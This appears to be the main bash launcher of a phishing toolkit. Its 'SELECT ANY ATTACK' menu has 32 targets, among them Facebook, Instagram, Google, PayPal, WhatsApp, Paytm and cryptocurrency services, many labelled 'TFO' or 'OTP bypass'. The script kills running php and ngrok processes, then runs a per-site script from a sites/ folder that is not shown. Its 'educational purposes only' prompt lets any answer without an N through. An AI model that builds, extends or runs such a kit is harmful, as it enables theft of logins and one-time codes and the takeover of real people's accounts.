#!/bin/bash
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32mT H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear

clear
chmod 777 Logo.sh
./Logo.sh
echo ""
echo -e $'\e[1;32m\e[0m\e[1;32m SELECT ANY ATTACK  \e[0m'
echo -e $'\e[1;37m\e[0m\e[1;37m --------------------- > > >\e[0m'
echo ""

printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;93m Tiktok\e[0m                 \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Zomato-TFO\e[0m         \e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit         \n"                                                                       
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m PhonePay-TFO\e[0m       \e[0m\n"                                                                                                                    
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-TFO\e[0m          \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Paypal-TFO\e[0m         \e[0m\n"                                                                                           
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Uber Eats-TFO\e[0m          \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m Telegram-TFO\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m OLA-TFO\e[0m                \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;93m Twitter-TFO\e[0m        \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google-TFO\e[0m             \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m Flipcart-TFO/\e[0m      \e[0m\n"                                                                                          
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Paytm-TFO\e[0m              \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m          \e[0m\n"                                                                                          
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Netflix-TFO\e[0m            \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat-TFO\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-Followers\e[0m    \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail-TFO\e[0m     \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Amazon-TFO\e[0m             \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m Stackoverflow\e[0m      \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m ebay-TFO\e[0m           \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m Twitch-TFO\e[0m         \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Hotstar-TFO\e[0m            \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m Ajio-TFO\e[0m           \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Spotify-TFO\e[0m            \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m Cryptocurrency/\e[0m    \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Github-TFO\e[0m             \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m Mobikwik-TFO\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m IPFinder\e[0m               \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m          \e[0m\n"                                                                                         


echo "" 
echo ""
                
                 read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
		 case $option in 
			 
                         1)cd sites/ 
                           cd tiktok/
                           chmod 7777 tiktok.sh  
                           ./tiktok.sh 


                ;;
	        
	        2)cd sites/
                  cd facebook/
                  chmod 7777 facebook.sh  
                  ./facebook.sh 



                ;;

                3) cd sites/
                  cd instagram/
                  chmod 7777 instagram.sh 
                  ./instagram.sh 

                ;;

                4)cd sites/
                  cd UberEats-Phishing/
                  chmod 7777 Uber-eats.sh 
                  ./Uber-eats.sh 
               
                ;;
                 
                5) cd sites/
                  cd ola-otpbypass/
                  chmod 7777 ola.sh  
                  ./ola.sh
                ;;
                
                6)cd sites/
                  cd google-otp/
                  chmod 7777 Google-otp.sh 
                  ./Google-otp.sh

                ;;
  
                7)cd sites/
                  cd Paytm-Phishing/
                  chmod 7777 Paytm.sh 
                  ./Paytm.sh
 
                ;;

                8)cd sites/
                  cd Netflix/
                  chmod 7777 Netflix.sh   
                  ./Netflix.sh 

                ;;


               9)cd sites/
                  cd instafollow/
                  chmod 7777 instafollow.sh
                  ./instafollow.sh

                ;;

               10)cd sites/
                  cd amazonsign/
                  chmod 7777 amazonsign.sh  
                  ./amazonsign.sh

                ;;

                11)cd sites/
                  cd whatsapp-phishing/
                  chmod 7777 Whatsapp.sh  
                  ./Whatsapp.sh

                ;;

                12)cd sites/
                  cd Linkedin/
                  chmod 7777 Linkedin.sh 
                  ./Linkedin.sh

                ;;
   
                13)cd sites/
                  cd Hotstar-otp-bypass/
                  chmod 7777 Hotstar.sh  
                  ./Hotstar.sh

                ;;
      
                14)cd sites/
                  cd spotify/
                  chmod 7777 spotify.sh 
                  ./spotify.sh

                ;;

                15)cd sites/
                  cd github/
                  chmod 7777 github.sh 
                  ./github.sh

                ;;

                16)cd sites/
                   cd ipfinder/
                   chmod 7777 ipfinder.sh  
                  ./ipfinder.sh

                ;;
                  
                 17)cd sites/ 
                    cd Zomato-Phishing/
                    chmod 7777 Zomato.sh  
                    ./Zomato.sh 


                ;;
	        
	        18)cd sites/
                  cd phonepay/
                  chmod 7777 phonepay.sh  
                  ./phonepay.sh 



                ;;

                19) cd sites/
                  cd paypal/
                  chmod 7777 paypal.sh 
                  ./paypal.sh 

                ;;

                20)cd sites/
                  cd telegram/
                  chmod 7777 telegram.sh 
                  ./telegram.sh 
               
                ;;
                 
                21) cd sites/
                  cd twitter/
                  chmod 7777 twitter.sh  
                  ./twitter.sh
                ;;
                
                22)cd sites/
                  cd flipcart/
                  chmod 7777 flipcart.sh 
                  ./flipcart.sh

                ;;
  
                23)cd sites/
                  cd wordpress/
                  chmod 7777 wordpress.sh 
                  ./wordpress.sh
 
                ;;

                24)cd sites/
                  cd snapchat/
                  chmod 7777 snapchat.sh   
                  ./snapchat.sh 

                ;;


               25)cd sites/
                  cd protonmail/
                  chmod 7777 protonmail.sh
                  ./protonmail.sh

                ;;

               26)cd sites/
                  cd stackoverflow/
                  chmod 7777 stackoverflow.sh  
                  ./stackoverflow.sh

                ;;

                27)cd sites/
                  cd ebay/
                  chmod 7777 ebay.sh  
                  ./ebay.sh

                ;;

                28)cd sites/
                  cd twitch/
                  chmod 7777 twitch.sh 
                  ./twitch.sh

                ;;
   
                29)cd sites/
                  cd ajio/
                  chmod 7777 ajio.sh  
                  ./ajio.sh

                ;;
      
                30)cd sites/
                  cd cryptocurrency/
                  chmod 7777 cryptocurrency.sh 
                  ./cryptocurrency.sh

                ;;

                31)cd sites/
                  cd mobikwik/
                  chmod 7777 mobikwik.sh 
                  ./mobikwik.sh

                ;;

                32)cd sites/
                   cd pinterest/
                   chmod 7777 pinterest.sh  
                  ./pinterest.sh

                ;;


                99)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m                                                         >> THANKS FOR JOIN US >> \e[0m'
                   sleep 1
                   exit
                ;;


                esac
                ;;
